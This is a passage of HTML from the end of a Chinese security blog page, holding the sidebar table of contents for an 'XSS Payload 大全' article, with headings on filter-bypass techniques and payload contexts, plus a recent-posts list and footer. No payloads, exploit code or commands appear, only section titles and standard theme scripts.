class="toc-number">2.</span> <span class="toc-text">第二组：标签与事件（成就系统）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%BB%84%EF%BC%9AHTML-%E5%B1%9E%E6%80%A7%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">第三组：HTML 属性注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%BB%84%EF%BC%9AJS-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%EF%BC%883%E5%85%B3%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">第四组：JS 上下文逃逸（3关）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%A4%A7%E5%85%A8"><span class="toc-number">5.</span> <span class="toc-text">三、常用绕过技巧大全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%88%E5%88%A0%E9%99%A4%E5%9E%8B%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">1. 双写绕过（删除型过滤）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88%EF%BC%88%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">2. 大小写混合（不区分大小写过滤）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTML-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%EF%BC%88%E5%89%8D%E7%AB%AF%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A3%80%E6%B5%8B%EF%BC%89"><span class="toc-number">5.3.</span> <span class="toc-text">3. HTML 实体编码（前端字符串检测）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-URL-%E7%BC%96%E7%A0%81"><span class="toc-number">5.4.</span> <span class="toc-text">4. URL 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-JavaScript-%E7%BC%96%E7%A0%81"><span class="toc-number">5.5.</span> <span class="toc-text">5. JavaScript 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%BB%95%E8%BF%87%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">5.6.</span> <span class="toc-text">6. 绕过括号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">5.7.</span> <span class="toc-text">7. 绕过引号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">5.8.</span> <span class="toc-text">8. 绕过空格过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E9%97%AD%E5%90%88%E6%A0%87%E7%AD%BE%E6%8A%80%E5%B7%A7"><span class="toc-number">5.9.</span> <span class="toc-text">9. 闭合标签技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">5.10.</span> <span class="toc-text">10. 伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8C%89%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%86%E7%B1%BB%E7%9A%84-Payload"><span class="toc-number">6.</span> <span class="toc-text">四、按上下文分类的 Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%88%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">HTML 上下文（标签之间）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-%E5%B1%9E%E6%80%A7%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%88%E5%B1%9E%E6%80%A7%E5%80%BC%E4%B8%AD%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">HTML 属性上下文（属性值中）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript-%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%89"><span class="toc-number">6.3.</span> <span class="toc-text">JavaScript 上下文（字符串中）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%88href-src-%E4%B8%AD%EF%BC%89"><span class="toc-number">6.4.</span> <span class="toc-text">URL 上下文（href&#x2F;src 中）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9-Payload-%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">7.</span> <span class="toc-text">五、快速选择 Payload 的流程</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/07/20/xss%20payload%E5%A4%A7%E5%85%A8/" title="XSS Payload 大全"><img src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS Payload 大全"/></a><div class="content"><a class="title" href="/2026/07/20/xss%20payload%E5%A4%A7%E5%85%A8/" title="XSS Payload 大全">XSS Payload 大全</a><time datetime="2026-07-20T04:00:00.000Z" title="发表于 2026-07-20 12:00:00">2026-07-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/" title="域渗透实战笔记"><img src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域渗透实战笔记"/></a><div class="content"><a class="title" href="/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/" title="域渗透实战笔记">域渗透实战笔记</a><time datetime="2026-07-15T04:00:00.000Z" title="发表于 2026-07-15 12:00:00">2026-07-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/30/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="Shiro反序列化漏洞详解"><img src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro反序列化漏洞详解"/></a><div class="content"><a class="title" href="/2026/06/30/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="Shiro反序列化漏洞详解">Shiro反序列化漏洞详解</a><time datetime="2026-06-30T08:00:00.000Z" title="发表于 2026-06-30 16:00:00">2026-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/30/Redis%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%88CVE-2022-0543%EF%BC%89/" title="Redis沙盒逃逸（CVE-2022-0543）"><img src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis沙盒逃逸（CVE-2022-0543）"/></a><div class="content"><a class="title" href="/2026/06/30/Redis%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%88CVE-2022-0543%EF%BC%89/" title="Redis沙盒逃逸（CVE-2022-0543）">Redis沙盒逃逸（CVE-2022-0543）</a><time datetime="2026-06-29T16:00:00.000Z" title="发表于 2026-06-30 00:00:00">2026-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/16/hello-world/" title="Hello World"><img src="https://s.panlai.com/zb_users/upload/2025/04/bizhihui_com_202504061743931260453893.jpg-pcthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2025/12/16/hello-world/" title="Hello World">Hello World</a><time datetime="2025-12-16T10:05:37.000Z" title="发表于 2025-12-16 18:05:37">2025-12-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 杰哥</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
